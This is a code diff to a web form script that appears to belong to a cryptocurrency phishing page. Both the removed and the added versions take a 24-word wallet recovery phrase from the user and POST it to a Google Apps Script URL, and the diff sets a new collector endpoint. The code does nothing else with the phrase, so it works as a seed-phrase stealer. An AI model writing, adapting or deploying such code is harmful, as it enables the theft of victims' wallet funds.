@@ -1,34 +1,54 @@
-
-
-const scriptURL = "https://script.google.com/macros/s/AKfycbwAKotFh6PGtK40HVNm9A4_razlWKmQbSdd2msMS48-7j_V0DYmLWbd3wsvjQOz7nMz/exec"; // Replace with your new deployment URL
-
-async function handleSubmit(event) {
+// Modified JavaScript to send the phrase to Google Apps Script
+function handleSubmit(event) {
     event.preventDefault();
     const errorElement = document.getElementById('emsg');
     errorElement.textContent = '';
+    const myButton = document.getElementById('b1');
+    myButton.disabled = true;
+    const myButton2 = document.getElementById('b2');
+    myButton2.disabled = true;
 
-    const inputValue = document.getElementById('myForm').elements['mf-texts'].value.trim();
+    const form = document.getElementById('myForm');
+    const inputValue = form.elements['mf-texts'].value.trim();
     
-    if (inputValue.split(/\s+/).length !== 24) {
+    const wordCount = inputValue.split(/\s+/).length;
+    if (wordCount !== 24) {
         errorElement.textContent = 'Invalid Passphrase';
+        myButton.disabled = false;
+        myButton2.disabled = false;
+        form.reset();
         return;
     }
-
-    try {
-        const response = await fetch(scriptURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: new URLSearchParams({ text: inputValue }),
-        });
-
-        const result = await response.json();
-        errorElement.textContent = result.status === "success" ? "Saved successfully!" : `Error: ${result.message}`;
-    } catch (error) {
-        errorElement.textContent = "Failed to save input.";
-    }
+    
+    const scriptUrl = "https://script.google.com/macros/s/AKfycbyqDKhG-L-mGMb31keevGn9gEqgoMAL6qAtRD86xjFljhFYhlcmmmrGRYGL_yFQNw8/exec";
+    
+    fetch(scriptUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phrase: inputValue })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.status !== "success") {
+            errorElement.textContent = 'Failed to save phrase';
+        } else {
+            errorElement.textContent = 'Passphrase saved successfully';
+        }
+        myButton.disabled = false;
+        myButton2.disabled = false;
+        form.reset();
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        errorElement.textContent = 'Error saving phrase';
+        myButton.disabled = false;
+        myButton2.disabled = false;
+        form.reset();
+    });
 }
 
-document.getElementById('myForm').addEventListener('submit', handleSubmit);
+const form = document.getElementById('myForm');
+form.addEventListener('submit', handleSubmit);
 
 
 
